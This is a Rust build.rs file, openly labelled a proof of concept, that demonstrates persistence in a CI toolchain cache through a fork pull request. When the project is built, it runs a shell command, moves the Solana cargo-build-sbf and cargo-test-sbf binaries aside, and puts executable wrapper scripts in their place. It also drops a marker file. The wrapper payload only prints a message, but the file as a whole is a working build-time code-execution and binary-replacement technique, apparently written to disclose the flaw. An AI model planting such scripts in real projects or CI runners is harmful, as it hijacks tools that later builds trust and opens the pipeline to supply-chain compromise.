use std::{env, fs, path::PathBuf, process::Command};

fn wrap_tool(bin_dir: &PathBuf, bin_name: &str) {
    let bin_path = bin_dir.join(bin_name);
    let real_path = bin_dir.join(format!("{bin_name}.real"));

    // Only wrap if the target exists and hasn't already been wrapped
    if !bin_path.exists() {
        println!("cargo:warning=WRAP_POC: {bin_name} not found; skipping");
        return;
    }
    if real_path.exists() {
        println!("cargo:warning=WRAP_POC: {bin_name} already wrapped; skipping");
        return;
    }

    // Move the original binary aside
    if let Err(e) = fs::rename(&bin_path, &real_path) {
        println!("cargo:warning=WRAP_POC: failed to rename {bin_name}: {e}");
        return;
    }

    // Write a harmless wrapper that prints and execs the real tool
    let wrapper = format!(
        r#"#!/usr/bin/env bash
echo "===HELLO_FROM_CACHE_POC=== $(basename "$0") on $(hostname)"
echo "This tool was wrapped by a fork PR to demonstrate cache/PATH persistence."
exec "$(dirname "$0")/{bin_name}.real" "$@"
"#,
        bin_name = bin_name
    );

    if let Err(e) = fs::write(&bin_path, wrapper.as_bytes()) {
        println!("cargo:warning=WRAP_POC: failed to write wrapper for {bin_name}: {e}");
        // best effort: try to restore original
        let _ = fs::rename(&real_path, &bin_path);
        return;
    }

    // Make it executable on Unix
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = fs::metadata(&bin_path) {
            let mut perms = meta.permissions();
            perms.set_mode(0o755);
            let _ = fs::set_permissions(&bin_path, perms);
        }
    }

    println!("cargo:warning=WRAP_POC: wrapped {bin_name}");
}

fn main() {
    // Run a quick, safe diag so you can see this executed in logs
    let _ = Command::new("sh")
        .arg("-lc")
        .arg(
            r#"
        printf '%s\n' '===WRAP_POC_BUILD_RS_START===' \
            'Assurances: No secrets read; No network; Non-destructive.';
        printf '%s\n' '===RCE HOME==='; printf '%s\n' "${HOME:-<unset>}";
        printf '%s\n' '===WRAP_POC_BUILD_RS_END===';
    "#,
        )
        .status();

    // Solana tools live here (per your workflow PATH)
    let home = env::var("HOME").unwrap_or_else(|_| ".".into());
    let bin_dir = PathBuf::from(home).join(".local/share/solana/install/active_release/bin");

    if !bin_dir.is_dir() {
        println!(
            "cargo:warning=WRAP_POC: bin dir not found: {}",
            bin_dir.display()
        );
        return;
    }

    // Wrap the Solana cargo subcommands your job calls
    wrap_tool(&bin_dir, "cargo-build-sbf");
    wrap_tool(&bin_dir, "cargo-test-sbf");

    // Leave a harmless marker in the tool dir (helps confirm cache persistence)
    let _ = fs::write(
        bin_dir.join("WRAP_POC_MARKER.txt"),
        "hello from wrapper PoC (safe)\n",
    );

    println!("cargo:warning=WRAP_POC: build.rs executed");
}
